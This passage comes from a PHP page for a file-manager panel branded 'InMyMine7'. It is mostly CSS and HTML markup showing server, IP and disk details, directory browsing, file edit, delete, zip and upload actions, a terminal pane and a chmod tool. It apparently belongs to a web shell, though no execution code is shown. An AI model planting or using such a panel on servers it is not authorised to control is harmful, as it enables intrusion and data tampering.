.brand-sub{font-family:'Fira Code',monospace;font-size:.55rem;font-weight:300;color:var(--dim);letter-spacing:.2em;text-transform:uppercase;margin-top:2px;}
.hdr-right{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.hdr-pill{display:flex;align-items:center;gap:6px;padding:5px 12px;background:var(--s2);border:1px solid var(--b1);border-radius:30px;font-size:.68rem;font-weight:500;color:var(--dim);}
.hdr-pill i{color:var(--v2);font-size:.7rem}
.hdr-pill strong{color:var(--txt);font-weight:700}
.lang-btn{display:inline-flex;align-items:center;gap:6px;padding:5px 14px;background:var(--s2);border:1.5px solid rgba(124,92,252,.35);border-radius:30px;font-size:.72rem;font-weight:700;color:var(--v2);text-decoration:none;transition:var(--tr);cursor:pointer;}
.lang-btn:hover{background:rgba(124,92,252,.15);border-color:var(--v2)}
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px;margin-bottom:18px;}
.card{background:var(--s1);border:1px solid var(--b1);border-radius:var(--rad);padding:12px 14px;position:relative;overflow:hidden;transition:var(--tr);}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--v),var(--c),var(--pk));background-size:200% auto;transform:scaleX(0);transform-origin:left;transition:transform .3s ease;}
.card:hover{border-color:var(--b3);transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.3)}
.card:hover::before{transform:scaleX(1)}
.card-icon{width:28px;height:28px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:.78rem;margin-bottom:8px;}
.card-icon.vi{background:rgba(124,92,252,.15);color:var(--v2)}
.card-icon.ci{background:rgba(0,245,196,.12);color:var(--c)}
.card-icon.pi{background:rgba(255,77,141,.12);color:var(--pk2)}
.card-icon.yi{background:rgba(255,209,102,.12);color:var(--y)}
.card-icon.gi{background:rgba(57,255,126,.12);color:var(--g)}
.card-icon.ri{background:rgba(255,61,107,.12);color:var(--r)}
.card-lbl{font-size:.56rem;font-weight:700;text-transform:uppercase;letter-spacing:.15em;color:var(--mute);margin-bottom:3px}
.card-val{font-family:'Fira Code',monospace;font-size:.74rem;color:var(--c2);word-break:break-all;line-height:1.4}
.disk-bar-wrap{height:4px;background:var(--b2);border-radius:4px;margin-top:5px;overflow:hidden;}
.disk-bar{height:100%;border-radius:4px;background:linear-gradient(90deg,var(--v),var(--c));}
.nav-bar{display:flex;align-items:center;gap:6px;margin-bottom:10px;flex-wrap:wrap;}
.nav-btn{display:inline-flex;align-items:center;justify-content:center;gap:5px;padding:6px 12px;background:var(--s2);border:1px solid var(--b1);border-radius:var(--rads);font-size:.72rem;font-weight:600;color:var(--dim);text-decoration:none;cursor:pointer;transition:var(--tr);}
.nav-btn:hover{background:var(--s3);border-color:var(--b3);color:var(--txt)}
.nav-btn.home-btn{color:var(--c);border-color:rgba(0,245,196,.3);}
.nav-btn.home-btn:hover{background:rgba(0,245,196,.1);}
.nav-btn.disabled{opacity:.35;pointer-events:none;}
.nav-btn.vw-active{background:rgba(124,92,252,.15);border-color:rgba(124,92,252,.4);color:var(--v2);}
.bc{display:flex;align-items:stretch;background:var(--s1);border:1px solid var(--b1);border-radius:var(--rad);margin-bottom:14px;overflow:hidden;overflow-x:auto;white-space:nowrap;scrollbar-width:thin;scrollbar-color:var(--mute) transparent;}
.bc::-webkit-scrollbar{height:3px}
.bc::-webkit-scrollbar-thumb{background:var(--mute);border-radius:3px}
.bc-home{display:flex;align-items:center;justify-content:center;padding:0 14px;height:40px;background:linear-gradient(135deg,rgba(124,92,252,.15),rgba(0,245,196,.08));border-right:1px solid var(--b1);color:var(--v2);font-size:.9rem;flex-shrink:0;cursor:pointer;transition:var(--tr);text-decoration:none;}
.bc-home:hover{background:rgba(0,245,196,.12);color:var(--c)}
.bc-sep{display:inline-flex;align-items:center;color:var(--mute);padding:0 2px;font-size:.65rem;flex-shrink:0;height:40px;}
.bc-seg-clickable{display:inline-flex;align-items:center;height:40px;flex-shrink:0;}
.bc-seg-clickable a{display:flex;align-items:center;height:100%;padding:0 9px;color:var(--dim);text-decoration:none;font-family:'Fira Code',monospace;font-size:.72rem;transition:var(--tr);}
.bc-seg-clickable a:hover{color:var(--c2);background:rgba(0,245,196,.06);}
.bc-seg-plain{display:inline-flex;align-items:center;height:40px;flex-shrink:0;padding:0 9px;font-family:'Fira Code',monospace;font-size:.72rem;color:var(--mute);opacity:.55;}
.bc-cur{display:inline-flex;align-items:center;height:40px;padding:0 14px;font-family:'Fira Code',monospace;font-size:.72rem;font-weight:700;color:var(--txt);background:rgba(124,92,252,.08);flex-shrink:0;}
.bc-cur i{color:var(--y);margin-right:6px;font-size:.75rem;}
.btn{display:inline-flex;align-items:center;gap:6px;border:none;border-radius:var(--rads);cursor:pointer;font-family:'DM Sans',sans-serif;font-weight:700;font-size:.78rem;text-decoration:none;transition:var(--tr);white-space:nowrap;letter-spacing:.02em;flex-shrink:0;}
.btn-v{background:linear-gradient(135deg,var(--v),#5c3de0);color:#fff;padding:9px 18px;box-shadow:0 2px 0 rgba(0,0,0,.4),0 0 0 1px rgba(124,92,252,.3);}
.btn-v:hover{background:linear-gradient(135deg,var(--v2),var(--v));transform:translateY(-2px);box-shadow:0 6px 20px rgba(124,92,252,.45)}
.btn-c{background:transparent;color:var(--c);border:1.5px solid rgba(0,245,196,.4);padding:8px 16px;}
.btn-c:hover{background:rgba(0,245,196,.1);border-color:var(--c);transform:translateY(-2px);}
.btn-save{background:linear-gradient(135deg,var(--v),var(--c) 150%);color:#fff;padding:9px 22px;font-size:.85rem;box-shadow:0 0 28px rgba(124,92,252,.35),0 2px 0 rgba(0,0,0,.3);}
.btn-save:hover{opacity:.88;transform:translateY(-2px);}
.btn-ghost{background:var(--ghost);color:var(--dim);border:1px solid var(--b2);padding:8px 16px;}
.btn-ghost:hover{color:var(--txt);border-color:var(--b3)}
.btn-r{background:rgba(255,61,107,.12);color:var(--r);border:1px solid rgba(255,61,107,.3);padding:7px 14px;}
.btn-r:hover{background:rgba(255,61,107,.22);border-color:var(--r)}
.btn-o{background:rgba(255,152,0,.12);color:var(--o);border:1px solid rgba(255,152,0,.3);padding:7px 14px;}
.btn-o:hover{background:rgba(255,152,0,.22);border-color:var(--o)}
.btn-y{background:rgba(255,209,102,.12);color:var(--y);border:1px solid rgba(255,209,102,.3);padding:7px 14px;}
.btn-y:hover{background:rgba(255,209,102,.22);border-color:var(--y)}
.ab{display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;border-radius:var(--radp);text-decoration:none;font-size:.74rem;transition:var(--tr);flex-shrink:0;border:1px solid transparent;}
.ab:hover{transform:translateY(-2px) scale(1.1)}
.ab-open{background:rgba(57,255,126,.08);border-color:rgba(57,255,126,.2);color:var(--g)}
.ab-edit{background:rgba(124,92,252,.1);border-color:rgba(124,92,252,.25);color:var(--v2)}
.ab-rename{background:rgba(255,209,102,.09);border-color:rgba(255,209,102,.25);color:var(--y)}
.ab-copy{background:rgba(0,200,150,.09);border-color:rgba(0,200,150,.25);color:#00ffd8}
.ab-dl{background:rgba(0,245,196,.09);border-color:rgba(0,245,196,.25);color:var(--c)}
.ab-del{background:rgba(255,61,107,.09);border-color:rgba(255,61,107,.25);color:var(--r)}
.ab-zip{background:rgba(255,152,0,.09);border-color:rgba(255,152,0,.25);color:var(--o)}
.ab-extract{background:rgba(86,204,242,.09);border-color:rgba(86,204,242,.25);color:#56ccf2}
.ab-open:hover{background:rgba(57,255,126,.18);border-color:var(--g)}
.ab-edit:hover{background:rgba(124,92,252,.2);border-color:var(--v2)}
.ab-rename:hover{background:rgba(255,209,102,.18);border-color:var(--y)}
.ab-copy:hover{background:rgba(0,200,150,.18);border-color:#00ffd8}
.ab-dl:hover{background:rgba(0,245,196,.18);border-color:var(--c)}
.ab-del:hover{background:rgba(255,61,107,.2);border-color:var(--r)}
.ab-zip:hover{background:rgba(255,152,0,.18);border-color:var(--o)}
.ab-extract:hover{background:rgba(86,204,242,.18);border-color:#56ccf2}
.bulk-bar{display:none;align-items:center;gap:8px;padding:9px 14px;background:rgba(124,92,252,.08);border:1px solid rgba(124,92,252,.25);border-radius:var(--rads);margin-bottom:10px;flex-wrap:wrap;}
.bulk-bar.active{display:flex;}
.bulk-bar span{font-size:.75rem;color:var(--v3);font-weight:600;}
.tbl-wrap{background:var(--s1);border:1px solid var(--b1);border-radius:var(--rad);overflow:hidden;overflow-x:auto;}
table{width:100%;border-collapse:collapse;min-width:600px}
thead tr{background:linear-gradient(90deg,var(--s3),var(--s2));border-bottom:1px solid var(--b2);}
th{padding:11px 12px;font-size:.58rem;font-weight:700;text-transform:uppercase;letter-spacing:.16em;color:var(--mute);text-align:left;}
.fr{border-bottom:1px solid rgba(30,30,60,.7);transition:background .13s}
.fr:last-child{border-bottom:none}
.fr:hover{background:rgba(124,92,252,.05)}
.fr.selected{background:rgba(124,92,252,.1)!important;}
td{padding:9px 12px;vertical-align:middle;font-size:.82rem}
.cb-cell{width:34px;padding:9px 8px 9px 12px;}
.row-cb{accent-color:var(--v);width:14px;height:14px;cursor:pointer;}
.nc{display:flex;align-items:center;gap:10px}
.fi-wrap{width:32px;height:32px;border-radius:7px;display:flex;align-items:center;justify-content:center;background:var(--s3);border:1px solid var(--b2);flex-shrink:0;}
.fi-folder{color:#ffd166;font-size:.95rem}
.fi-file{font-size:.9rem}
.fn{font-weight:600;color:var(--txt);word-break:break-all;}
.badge-dir{display:inline-flex;align-items:center;gap:4px;padding:3px 9px;border-radius:20px;font-size:.58rem;font-weight:800;letter-spacing:.1em;text-transform:uppercase;background:rgba(124,92,252,.13);color:var(--v2);border:1px solid rgba(124,92,252,.28);}
.fsize{font-family:'Fira Code',monospace;font-size:.7rem;color:var(--dim)}
.mtime{font-family:'Fira Code',monospace;font-size:.67rem;color:var(--mute);white-space:nowrap}
.perms{font-family:'Fira Code',monospace;font-size:.67rem;color:var(--mute);white-space:nowrap}
.ac{display:flex;align-items:center;gap:3px;flex-wrap:nowrap}
.empty-td{padding:0!important}
.empty-state{padding:60px 20px;text-align:center;color:var(--mute);display:flex;flex-direction:column;align-items:center;gap:10px;}
.empty-state i{font-size:2.2rem;opacity:.3}
.empty-state span{font-size:.82rem}
.grid-view{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px;padding:14px;}
.grid-item{background:var(--s2);border:1px solid var(--b1);border-radius:var(--rad);padding:16px 10px 12px;text-align:center;cursor:pointer;transition:var(--tr);position:relative;}
.grid-item:hover{background:var(--s3);border-color:var(--b3);transform:translateY(-3px);box-shadow:0 8px 24px rgba(0,0,0,.3);}
.grid-icon{margin-bottom:8px;}
.grid-name{font-size:.74rem;font-weight:600;color:var(--txt);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-bottom:4px;}
.grid-meta{font-family:'Fira Code',monospace;font-size:.62rem;color:var(--mute);margin-bottom:7px;}
.grid-actions{display:flex;justify-content:center;gap:3px;flex-wrap:wrap;}
.grid-item .grid-actions .ab{width:24px;height:24px;font-size:.67rem;}
.panel{margin-top:10px;background:var(--s1);border:1px solid var(--b2);border-radius:var(--rad);overflow:hidden;box-shadow:0 0 0 1px rgba(124,92,252,.1),0 20px 60px rgba(0,0,0,.4);}
.panel-hdr{background:linear-gradient(90deg,var(--s3),var(--s2));padding:11px 18px;display:flex;align-items:center;gap:9px;border-bottom:1px solid var(--b2);}
.panel-hdr-icon{width:26px;height:26px;border-radius:6px;background:rgba(124,92,252,.2);display:flex;align-items:center;justify-content:center;color:var(--v2);font-size:.78rem;}
.panel-hdr-title{font-family:'Fira Code',monospace;font-size:.7rem;font-weight:600;text-transform:uppercase;letter-spacing:.14em;color:var(--v3);}
.panel-hdr-name{color:var(--txt);font-weight:400;margin-left:4px;opacity:.8}
.panel-body{padding:18px;display:flex;flex-direction:column;gap:12px}
.field{width:100%;background:var(--bg);border:1px solid var(--b2);border-radius:var(--rads);color:var(--txt);font-family:'Fira Code',monospace;font-size:.78rem;padding:10px 14px;outline:none;transition:var(--tr);}
.field:focus{border-color:var(--v);box-shadow:0 0 0 3px rgba(124,92,252,.12)}
.field::placeholder{color:var(--mute)}
textarea.field{height:480px;resize:vertical;line-height:1.75;tab-size:4;}
.editor-meta{display:flex;align-items:center;gap:8px;padding:7px 13px;background:var(--s3);border:1px solid var(--b1);border-radius:var(--rads);font-family:'Fira Code',monospace;font-size:.67rem;color:var(--dim);flex-wrap:wrap;}
.editor-meta span{display:flex;align-items:center;gap:4px}
.editor-meta i{color:var(--v2)}
.terminal-wrap{background:#000;border:1px solid var(--b2);border-radius:var(--rads);font-family:'Fira Code',monospace;font-size:.78rem;padding:13px 15px;max-height:300px;overflow-y:auto;line-height:1.6;white-space:pre-wrap;word-break:break-all;}
.terminal-wrap .tout{color:#0f0;}
.terminal-wrap .tprompt{color:var(--c);margin-top:6px;display:block;}
.search-result-item{padding:9px 11px;background:var(--s2);border:1px solid var(--b2);border-radius:var(--rads);margin-bottom:7px;display:flex;align-items:center;gap:11px;transition:var(--tr);cursor:pointer;}
.search-result-item:hover{background:var(--s3);border-color:var(--v)}
.search-result-path{flex:1;font-family:'Fira Code',monospace;font-size:.74rem;color:var(--txt);word-break:break-all;}
.search-result-type{font-size:.62rem;color:var(--mute);text-transform:uppercase;background:rgba(124,92,252,.1);padding:2px 7px;border-radius:4px;flex-shrink:0;}
/* Tools */
.tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;margin-bottom:16px;}
.tool-card{background:var(--s2);border:1px solid var(--b1);border-radius:var(--rad);padding:14px 16px;cursor:pointer;transition:var(--tr);display:flex;flex-direction:column;gap:7px;}
.tool-card:hover{background:var(--s3);border-color:var(--b3);transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.3);}
.tool-card-header{display:flex;align-items:center;gap:9px;}
.tool-card-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:.88rem;flex-shrink:0;}
.tool-card-title{font-weight:700;font-size:.82rem;color:var(--txt);}
.tool-card-desc{font-size:.72rem;color:var(--dim);line-height:1.4;}
.tool-panel{display:none;margin-top:10px;}
.tool-panel.active{display:block;}
.tool-section{background:var(--s1);border:1px solid var(--b2);border-radius:var(--rad);overflow:hidden;}
.tool-section-hdr{background:linear-gradient(90deg,var(--s3),var(--s2));padding:10px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--b2);}
.tool-section-body{padding:16px;display:flex;flex-direction:column;gap:11px;}
.tool-result{background:var(--bg);border:1px solid var(--b2);border-radius:var(--rads);padding:11px 14px;font-family:'Fira Code',monospace;font-size:.78rem;color:var(--c2);white-space:pre-wrap;word-break:break-all;min-height:48px;line-height:1.6;}
.tool-row{display:flex;gap:9px;align-items:center;flex-wrap:wrap;}
.tool-label{font-size:.72rem;color:var(--dim);min-width:80px;flex-shrink:0;}
.sysinfo-table{width:100%;border-collapse:collapse;font-size:.76rem;}
.sysinfo-table tr{border-bottom:1px solid var(--b1);}
.sysinfo-table tr:last-child{border-bottom:none}
.sysinfo-table td{padding:7px 10px;vertical-align:top;}
.sysinfo-table td:first-child{color:var(--dim);font-family:'Fira Code',monospace;font-size:.7rem;width:35%;font-weight:600;}
.sysinfo-table td:last-child{color:var(--txt);word-break:break-all;}
.chmod-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;}
.chmod-group{background:var(--s3);border:1px solid var(--b1);border-radius:var(--rads);padding:10px;}
.chmod-group-title{font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:.12em;color:var(--dim);margin-bottom:7px;text-align:center;}
.chmod-cb-row{display:flex;flex-direction:column;gap:5px;}
.chmod-cb-item{display:flex;align-items:center;gap:6px;font-size:.75rem;cursor:pointer;}
.chmod-cb-item input{accent-color:var(--v)}
.chmod-result-big{font-family:'Fira Code',monospace;font-size:2rem;font-weight:700;color:var(--v2);text-align:center;padding:12px;background:var(--bg);border:1px solid var(--b2);border-radius:var(--rads);}
.copy-btn{background:none;border:1px solid var(--b2);border-radius:4px;color:var(--dim);font-size:.68rem;padding:2px 8px;cursor:pointer;transition:var(--tr);}
.copy-btn:hover{color:var(--c);border-color:var(--c)}
.tab-tools{color:var(--o)!important;}
.tab-tools.active{background:rgba(255,152,0,.12)!important;border-color:rgba(255,152,0,.35)!important;color:var(--o)!important;}
/* Modal */
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.88);display:none;align-items:center;justify-content:center;z-index:5000;padding:20px;}
.modal-overlay.active{display:flex}
.modal{background:var(--s1);border:1px solid var(--b2);border-radius:var(--rad);padding:24px;max-width:460px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.6);animation:modalIn .22s cubic-bezier(.34,1.56,.64,1);}
@keyframes modalIn{from{opacity:0;transform:scale(.92) translateY(16px)}to{opacity:1;transform:scale(1) translateY(0)}}
.modal-title{font-size:.95rem;font-weight:700;margin-bottom:14px;color:var(--txt);display:flex;align-items:center;gap:9px;}
.modal-title i{color:var(--v2)}
.modal-body{margin-bottom:18px;display:flex;flex-direction:column;gap:11px;}
.modal-footer{display:flex;gap:9px;justify-content:flex-end;}
.confirm-modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.92);display:none;align-items:center;justify-content:center;z-index:9000;padding:20px;}
.confirm-modal-overlay.active{display:flex}
.confirm-box{background:var(--s1);border:1px solid var(--b2);border-radius:var(--rad);padding:28px;max-width:400px;width:100%;box-shadow:0 20px 70px rgba(0,0,0,.7);animation:modalIn .2s ease;}
.confirm-icon-wrap{width:56px;height:56px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.4rem;margin:0 auto 16px;}
.confirm-icon-wrap.del{background:rgba(255,61,107,.14);color:var(--r);border:2px solid rgba(255,61,107,.3);}
.confirm-title{font-size:1rem;font-weight:700;color:var(--txt);text-align:center;margin-bottom:7px;}
.confirm-msg{font-size:.82rem;color:var(--dim);text-align:center;margin-bottom:20px;line-height:1.5;}
.confirm-file{background:var(--s3);border:1px solid var(--b2);border-radius:var(--rads);padding:8px 14px;font-family:'Fira Code',monospace;font-size:.76rem;color:var(--v3);text-align:center;margin-bottom:18px;word-break:break-all;}
.confirm-footer{display:flex;gap:10px;justify-content:center;}
#tc{position:fixed;top:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none;}
.toast{display:flex;align-items:flex-start;gap:12px;min-width:280px;max-width:400px;padding:0;border-radius:12px;border:1px solid transparent;pointer-events:all;animation:tin .35s cubic-bezier(.34,1.56,.64,1) both;position:relative;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,.5);}
.toast.hiding{animation:tout .25s ease forwards}
.toast-ok{background:linear-gradient(135deg,rgba(6,20,16,.98),rgba(4,16,13,.98));border-color:rgba(0,245,196,.3);}
.toast-err{background:linear-gradient(135deg,rgba(24,6,12,.98),rgba(20,4,10,.98));border-color:rgba(255,61,107,.3);}
.toast-stripe{width:4px;flex-shrink:0;border-radius:12px 0 0 12px}
.toast-ok .toast-stripe{background:linear-gradient(180deg,var(--c),var(--v))}
.toast-err .toast-stripe{background:linear-gradient(180deg,var(--r),var(--pk))}
.toast-inner{flex:1;padding:13px 12px 13px 0;display:flex;gap:10px;align-items:flex-start}
.toast-ico{width:32px;height:32px;border-radius:9px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:.9rem;}
.toast-ok .toast-ico{background:rgba(0,245,196,.12);color:var(--c)}
.toast-err .toast-ico{background:rgba(255,61,107,.12);color:var(--r)}
.toast-content{flex:1;padding-right:20px}
.toast-title{font-weight:800;font-size:.65rem;text-transform:uppercase;letter-spacing:.14em;margin-bottom:2px;}
.toast-ok .toast-title{color:var(--c2)}
.toast-err .toast-title{color:#ff7090}
.toast-msg{font-size:.8rem;color:var(--txt);opacity:.88;line-height:1.4;word-break:break-word}
.toast-x{position:absolute;top:9px;right:10px;font-size:.72rem;color:var(--mute);cursor:pointer;background:none;border:none;padding:3px 5px;transition:var(--tr);border-radius:4px;}
.toast-x:hover{color:var(--txt);background:rgba(255,255,255,.07)}
.tbar{position:absolute;bottom:0;left:0;height:2px;border-radius:0 0 12px 12px;animation:tbar var(--dur,4.5s) linear forwards;}
.toast-ok .tbar{background:linear-gradient(90deg,var(--c),var(--v))}
.toast-err .tbar{background:linear-gradient(90deg,var(--r),var(--pk))}
@keyframes tin{from{opacity:0;transform:translateX(70px) scale(.92)}to{opacity:1;transform:translateX(0) scale(1)}}
@keyframes tout{from{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(70px)}}
@keyframes tbar{from{width:100%}to{width:0}}
.tab-bar{display:flex;gap:3px;background:var(--s1);border:1px solid var(--b1);border-radius:var(--rad);padding:5px;margin-bottom:14px;flex-wrap:wrap;}
.tab{display:flex;align-items:center;gap:5px;padding:6px 13px;border-radius:var(--rads);font-size:.74rem;font-weight:600;color:var(--dim);cursor:pointer;transition:var(--tr);border:1px solid transparent;user-select:none;}
.tab:hover{background:var(--s3);color:var(--txt)}
.tab.active{background:rgba(124,92,252,.15);border-color:rgba(124,92,252,.35);color:var(--v2);}
.tab i{font-size:.76rem}
.tab-content{display:none}
.tab-content.active{display:block}
.editor-banner{background:rgba(124,92,252,.08);border:1px solid rgba(124,92,252,.25);border-radius:var(--rads);padding:9px 14px;display:flex;align-items:center;gap:10px;font-size:.78rem;margin-bottom:10px;}
.editor-banner i{color:var(--v2)}
.editor-banner a{color:var(--r);font-weight:700;text-decoration:none;margin-left:auto;display:flex;align-items:center;gap:5px;padding:4px 11px;background:rgba(255,61,107,.1);border:1px solid rgba(255,61,107,.3);border-radius:var(--radp);}
.editor-banner a:hover{background:rgba(255,61,107,.2)}
.input-group{display:flex;gap:7px;align-items:center;}
.input-group label{font-size:.72rem;color:var(--dim);white-space:nowrap;min-width:85px;}
.field-sm{background:var(--bg);border:1px solid var(--b2);border-radius:var(--rads);color:var(--txt);font-family:'Fira Code',monospace;font-size:.78rem;padding:7px 11px;outline:none;transition:var(--tr);width:100%;}
.field-sm:focus{border-color:var(--v);box-shadow:0 0 0 2px rgba(124,92,252,.1)}
.field-sm::placeholder{color:var(--mute)}
.file-drop{position:relative;display:flex;align-items:center;cursor:pointer;}
.file-drop input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%;z-index:2;}
.file-drop-label{display:flex;align-items:center;gap:7px;padding:9px 14px;background:var(--s3);border:2px dashed var(--b3);border-radius:var(--rads);font-family:'Fira Code',monospace;font-size:.76rem;color:var(--dim);width:100%;pointer-events:none;transition:var(--tr);}
.file-drop-label i{color:var(--v2);flex-shrink:0}
.file-drop.has-file .file-drop-label{border-color:var(--v);color:var(--txt);background:rgba(124,92,252,.08);}
.file-drop:hover .file-drop-label{border-color:var(--v);color:var(--txt)}
.file-drop.drag-over .file-drop-label{border-color:var(--c);color:var(--c);background:rgba(0,245,196,.07);}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--mute);border-radius:4px}
::-webkit-scrollbar-thumb:hover{background:var(--dim)}
@media(max-width:640px){
  .wrap{padding:12px 10px 60px}
  .ab{width:25px;height:25px;font-size:.68rem}
  .cards{grid-template-columns:1fr 1fr}
  .mtime,.perms{display:none}
  #tc{top:10px;right:10px}
  .toast{min-width:240px}
  .tools-grid{grid-template-columns:1fr 1fr}
  .chmod-grid{grid-template-columns:1fr}
}
</style>
</head>
<body>
<div class="bg-layer"></div>
<div class="bg-grid"></div>
<div class="wrap">

<!-- HEADER -->
<div class="hdr">
  <div class="brand-block">
    <div class="brand-logo"><i class="fa-solid fa-terminal"></i></div>
    <div>
      <div class="brand">InMyMine7</div>
      <div class="brand-sub"><i class="fa-solid fa-circle" style="color:var(--g);font-size:.42rem"></i> <?=htmlspecialchars($t['brand_sub'])?></div>
    </div>
  </div>
  <div class="hdr-right">
    <div class="hdr-pill"><i class="fa-solid fa-folder-tree"></i> <strong><?=$dc_count?></strong> <?=$t['folders']?></div>
    <div class="hdr-pill"><i class="fa-solid fa-file"></i> <strong><?=$fc_count?></strong> <?=$t['files']?></div>
    <div class="hdr-pill"><i class="fa-brands fa-php"></i> PHP <strong><?=PHP_VERSION?></strong></div>
    <div class="hdr-pill"><i class="fa-solid fa-hard-drive"></i> <strong><?=$disk_free?></strong> <?=$t['free']?></div>
    <!-- FIX: Lang toggle selalu membawa dir parameter agar tidak reset direktori -->
    <a href="?dir=<?=$eDir?>&tab=<?=urlencode($active_tab)?>&lang=<?=$lang==='id'?'en':'id'?>" class="lang-btn">
      <?=$t['lang_icon']?> <?=$t['lang_toggle']?>
    </a>
    <!-- Logout button -->
    <a href="?logout=1" class="btn btn-r" style="padding: 7px 14px;">
      <i class="fa-solid fa-sign-out-alt"></i> Logout
    </a>
  </div>
</div>

<!-- INFO CARDS -->
<div class="cards">
  <div class="card"><div class="card-icon vi"><i class="fa-solid fa-microchip"></i></div><div class="card-lbl"><?=$t['os_kernel']?></div><div class="card-val"><?=htmlspecialchars(php_uname('s').' '.php_uname('r'))?></div></div>
  <div class="card"><div class="card-icon ci"><i class="fa-solid fa-server"></i></div><div class="card-lbl"><?=$t['server_ip']?></div><div class="card-val"><?=htmlspecialchars($_SERVER['SERVER_ADDR']??'127.0.0.1')?></div></div>
  <div class="card"><div class="card-icon pi"><i class="fa-solid fa-location-dot"></i></div><div class="card-lbl"><?=$t['remote_ip']?></div><div class="card-val"><?=htmlspecialchars($_SERVER['REMOTE_ADDR']??'127.0.0.1')?></div></div>
  <div class="card"><div class="card-icon yi"><i class="fa-solid fa-globe"></i></div><div class="card-lbl"><?=$t['domain']?></div><div class="card-val"><?=htmlspecialchars($_SERVER['SERVER_NAME']??'localhost')?></div></div>
  <div class="card">
    <div class="card-icon gi"><i class="fa-solid fa-database"></i></div>
    <div class="card-lbl"><?=$t['disk_used']?></div>
    <div class="card-val"><?=$disk_used?> / <?=$disk_total?>
    <?php if(function_exists('disk_free_space')&&function_exists('disk_total_space')){$pct=round((disk_total_space($current_dir)-disk_free_space($current_dir))/max(1,disk_total_space($current_dir))*100);echo "<div class='disk-bar-wrap'><div class='disk-bar' style='width:{$pct}%'></div></div>";}?>
    </div>
  </div>
  <div class="card"><div class="card-icon ri"><i class="fa-solid fa-clock"></i></div><div class="card-lbl"><?=$t['server_time']?></div><div class="card-val" id="server-clock"><?=date('d M Y H:i:s')?></div></div>
</div>

<!-- NAV BAR -->
<?php $listActive=($view_mode==='list')?'vw-active':'';$gridActive=($view_mode==='grid')?'vw-active':'';?>
<div class="nav-bar">
  <a href="?dir=<?=$eRoot?>&tab=files<?=$lp?>" class="nav-btn home-btn"><i class="fa-solid fa-house-chimney"></i> <?=$t['home']?></a>
  <?php if(!$is_root):?>
  <a href="?dir=<?=$eParent?>&tab=files<?=$lp?>" class="nav-btn"><i class="fa-solid fa-turn-up"></i> <?=$t['up']?></a>
  <?php else:?>
  <span class="nav-btn disabled"><i class="fa-solid fa-turn-up"></i> <?=$t['up']?></span>
  <?php endif;?>
  <span style="flex:1"></span>
  <a href="?dir=<?=$eDir?>&view=list&tab=<?=urlencode($active_tab)?><?=$lp?>" class="nav-btn <?=$listActive?>"><i class="fa-solid fa-list-ul"></i> <?=$t['list_view']?></a>
  <a href="?dir=<?=$eDir?>&view=grid&tab=<?=urlencode($active_tab)?><?=$lp?>" class="nav-btn <?=$gridActive?>"><i class="fa-solid fa-grip"></i> <?=$t['grid_view']?></a>
  <a href="javascript:location.reload()" class="nav-btn"><i class="fa-solid fa-rotate-right"></i> <?=$t['refresh']?></a>
</div>

<!-- BREADCRUMB -->
<div class="bc">
  <a href="?dir=<?=$eRoot?>&tab=files<?=$lp?>" class="bc-home" title="<?=htmlspecialchars((string)$root_dir)?>">
    <i class="fa-solid fa-house-chimney"></i>
  </a>
  <?php
  $last = count($crumbs) - 1;
  foreach ($crumbs as $i => $c):
      $isLast = ($i === $last);
      echo "<span class='bc-sep'><i class='fa-solid fa-chevron-right'></i></span>";
      if ($isLast):
  ?>
      <span class="bc-cur"><i class="fa-solid fa-folder-open"></i><?=htmlspecialchars($c['label'])?></span>
  <?php
      elseif ($c['clickable']):
          $eP = urlencode((string)$c['path']);
  ?>
      <span class="bc-seg-clickable">
          <a href="?dir=<?=$eP?>&tab=files<?=$lp?>" title="<?=htmlspecialchars((string)$c['path'])?>">
              <i class="fa-solid fa-folder" style="color:var(--dim);margin-right:4px;font-size:.7rem"></i><?=htmlspecialchars($c['label'])?>
          </a>
      </span>
  <?php
      else:
  ?>
      <span class="bc-seg-plain" title="<?=htmlspecialchars((string)$c['path'])?>">
          <i class="fa-solid fa-hdd" style="margin-right:4px;font-size:.7rem"></i><?=htmlspecialchars($c['label'])?>
      </span>
  <?php
      endif;
  endforeach;
  ?>
</div>

<!-- TAB BAR -->
<div class="tab-bar">
  <div class="tab <?=$active_tab==='files'?'active':''?>" onclick="switchTab('files')"><i class="fa-solid fa-folder-open"></i> <?=$t['tab_files']?></div>
  <div class="tab <?=$active_tab==='upload'?'active':''?>" onclick="switchTab('upload')"><i class="fa-solid fa-cloud-arrow-up"></i> <?=$t['tab_upload']?></div>
  <div class="tab <?=$active_tab==='create'?'active':''?>" onclick="switchTab('create')"><i class="fa-solid fa-plus"></i> <?=$t['tab_create']?></div>
  <div class="tab <?=$active_tab==='zip'?'active':''?>" onclick="switchTab('zip')"><i class="fa-solid fa-file-zipper"></i> <?=$t['tab_zip']?></div>
  <div class="tab <?=$active_tab==='search'?'active':''?>" onclick="switchTab('search')"><i class="fa-solid fa-magnifying-glass"></i> <?=$t['tab_search']?></div>
